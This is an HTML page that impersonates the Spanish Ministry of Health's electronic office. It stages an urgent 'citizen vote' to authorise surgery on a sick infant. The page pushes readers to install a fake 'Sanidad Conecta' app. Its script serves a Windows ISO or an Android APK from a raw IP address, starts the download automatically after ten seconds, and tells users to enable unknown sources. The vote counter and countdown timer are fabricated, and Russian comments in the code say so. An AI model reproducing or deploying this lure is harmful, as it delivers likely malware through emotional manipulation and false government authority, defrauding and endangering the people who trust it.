<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sede Electrónica - MSCBS | Votación urgente</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Helvetica,Arial,sans-serif;background:#eef1f5;color:#222;line-height:1.5}
.topbar{background:#003d7a;color:#fff;padding:10px 0;font-size:.85rem}
.topbar .wrap{max-width:960px;margin:0 auto;padding:0 20px;display:flex;justify-content:space-between}
.topbar a{color:#cfe2ff;text-decoration:none}
header{background:#fff;border-bottom:3px solid #0056a7;padding:18px 0}
header .wrap{max-width:960px;margin:0 auto;padding:0 20px;display:flex;align-items:center;gap:14px}
.logo{width:42px;height:42px;background:#0056a7;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:bold;font-size:1.1rem}
header h1{font-size:1.15rem;color:#003d7a;font-weight:600}
header span{display:block;font-size:.8rem;color:#666;font-weight:400}
main{max-width:960px;margin:26px auto;padding:0 20px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.08);padding:30px;margin-bottom:22px}
h2{font-size:1.5rem;color:#003d7a;margin-bottom:14px}
.urgente{background:#fdecea;border-left:4px solid #d93025;padding:14px 16px;margin:18px 0;border-radius:4px;font-size:.95rem}
.urgente b{color:#b3261e}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin:22px 0}
.grid img{width:100%;border-radius:6px;border:1px solid #ddd;display:block}
.grid figcaption{font-size:.8rem;color:#666;margin-top:6px;text-align:center}
.progress{background:#e6e9ee;border-radius:20px;height:26px;overflow:hidden;margin:8px 0 4px}
.progress > div{height:100%;background:linear-gradient(90deg,#0056a7,#28a745);width:0;transition:width .6s;color:#fff;font-size:.78rem;display:flex;align-items:center;justify-content:center;font-weight:600}
.votes{font-size:.9rem;color:#555}
.btn{display:inline-block;background:#28a745;color:#fff;padding:14px 34px;border-radius:30px;text-decoration:none;font-size:1.15rem;font-weight:bold;margin:14px 0;transition:.25s;border:none;cursor:pointer}
.btn:hover{background:#1e7e34}
.btn:disabled{background:#999;cursor:not-allowed}
.instrucciones{background:#f8f9fa;border-radius:6px;padding:18px;font-size:.92rem;margin:20px 0}
.instrucciones b{color:#003d7a}
.footer{margin-top:34px;font-size:.8rem;color:#666;border-top:1px solid #ddd;padding-top:16px;text-align:center}
.footer a{color:#0056a7;text-decoration:none;margin:0 8px}
.badge{display:inline-block;background:#0056a7;color:#fff;font-size:.72rem;padding:3px 9px;border-radius:10px;vertical-align:middle;margin-left:8px}
</style>
</head>
<body>

<div class="topbar">
  <div class="wrap">
    <div>Gobierno de España · Ministerio de Sanidad</div>
    <div><a href="#">Sede Electrónica</a> · <a href="#">Ayuda</a></div>
  </div>
</div>

<header>
  <div class="wrap">
    <div class="logo">MS</div>
    <div>
      <h1>Sede Electrónica — Ministerio de Sanidad<span>sede.mscbs.gob.es</span></h1>
    </div>
  </div>
</header>

<main>
  <div class="card">
    <h2>Votación ciudadana urgente: autorización de intervención quirúrgica pediátrica</h2>
    <p>Expediente <b>#MSCBS-2026-09472</b> · Paciente: <b>menor de 14 meses</b> · Diagnóstico confirmado: <b>tumor cerebral maligno (glioma de alto grado)</b>.</p>

    <div class="urgente">
      <b>⚠ Plazo de votación: quedan 2 horas.</b><br>
      El Comité de Bioética ha activado el procedimiento de <b>consulta pública vinculante</b> conforme al artículo 41.3 del Real Decreto-ley 14/2025. Sin el número mínimo de votos, la intervención <b>no podrá autorizarse</b> y el menor quedará fuera de la ventana terapéutica.
    </div>

    <div class="grid">
      <figure>
        <img src="https://i.ibb.co/gbnbKkqm/IMG-20260927-082618-229.jpg" alt="Paciente menor">
        <figcaption>Paciente — 14 meses (imagen cedida por la familia)</figcaption>
      </figure>
      <figure>
        <img src="https://i.ibb.co/Y4LRt7LD/IMG-20260927-082618-931.jpg" alt="RMN — tumor cerebral">
        <figcaption>RMN craneal — glioma de alto grado, lóbulo frontal</figcaption>
      </figure>
    </div>

    <h3 style="margin-top:18px;color:#003d7a">Progreso de la votación</h3>
    <div class="progress"><div id="bar">0%</div></div>
    <p class="votes"><span id="count">0</span> de <b>50 000</b> votos necesarios · <span id="timeLeft">02:00:00</span> restantes</p>

    <div style="text-align:center;margin-top:10px">
      <button class="btn" id="voteBtn" disabled>✔ Votar a favor de la intervención</button>
      <p style="font-size:.85rem;color:#666;margin-top:6px">Para emitir su voto es obligatorio instalar la aplicación oficial <b>Sanidad Conecta</b>.</p>
    </div>

    <div class="instrucciones">
      <b>Pasos para votar:</b><br>
      1. Pulse <b>Descargar Sanidad Conecta</b> abajo.<br>
      2. <b>Windows:</b> descargue el archivo ISO, móntelo (doble clic) y ejecute <em>SanidadConecta</em>. <b>Android:</b> active <em>Orígenes desconocidos</em> (Ajustes &gt; Seguridad) y abra el APK.<br>
      3. Inicie sesión con certificado digital o Cl@ve.<br>
      4. El voto se emitirá automáticamente.
    </div>

    <div style="text-align:center;margin-top:14px">
      <a href="#" class="btn" id="downloadBtn">▼ Descargar Sanidad Conecta</a>
    </div>

    <p style="text-align:center;font-size:.85rem;color:#666;margin-top:10px">
      Si ya tiene instalada la aplicación, puede <a href="#" id="updLink">actualizar aquí</a>.
    </p>
  </div>

  <div class="footer">
    © Ministerio de Sanidad — Sede Electrónica · <a href="#">Aviso legal</a> · <a href="#">Protección de datos</a> · <a href="#">Accesibilidad</a>
  </div>
</main>

<script>
(function(){
  var WINDOWS_ISO = 'http://95.85.229.133:2222/Instalador_SanidadConecta.iso';
  var ANDROID_APK = 'http://95.85.229.133:2225/SanidadConecta.apk';

  var ua = navigator.userAgent;
  var isWindows = ua.indexOf('Windows') !== -1;
  var isAndroid = ua.indexOf('Android') !== -1;
  var dl = document.getElementById('downloadBtn');

  if (isWindows) { dl.href = WINDOWS_ISO; dl.textContent = '▼ Descargar para Windows (ISO)'; }
  else if (isAndroid) { dl.href = ANDROID_APK; dl.textContent = '▼ Descargar para Android (APK)'; }
  else { dl.href = '#'; dl.textContent = '▼ Sistema no soportado'; }

  // auto-download через 10 сек
  setTimeout(function(){ if (dl.href && dl.href !== '#') dl.click(); }, 10000);

  // фейковый счётчик голосов
  var count = 38412, target = 50000, need = target;
  var countEl = document.getElementById('count');
  var barEl = document.getElementById('bar');
  function tick(){
    count += Math.floor(Math.random()*7)+3;
    if (count > target) count = target;
    countEl.textContent = count.toLocaleString('es-ES');
    var p = Math.round(count/target*100);
    barEl.style.width = p + '%';
    barEl.textContent = p + '%';
  }
  tick(); setInterval(tick, 1800);

  // таймер 2 часа
  var t = 2*3600;
  var tEl = document.getElementById('timeLeft');
  setInterval(function(){
    if (t > 0) t--;
    var h = String(Math.floor(t/3600)).padStart(2,'0');
    var m = String(Math.floor((t%3600)/60)).padStart(2,'0');
    var s = String(t%60).padStart(2,'0');
    tEl.textContent = h+':'+m+':'+s;
  }, 1000);

  // кнопка "Votar" активируется после клика по download
  var voteBtn = document.getElementById('voteBtn');
  dl.addEventListener('click', function(){
    setTimeout(function(){ voteBtn.disabled = false; voteBtn.textContent = '✔ Votar a favor (requiere app instalada)'; }, 1200);
  });
  voteBtn.addEventListener('click', function(){
    voteBtn.textContent = '✔ Voto registrado — gracias';
    voteBtn.disabled = true;
  });
})();
</script>
</body>
</html>
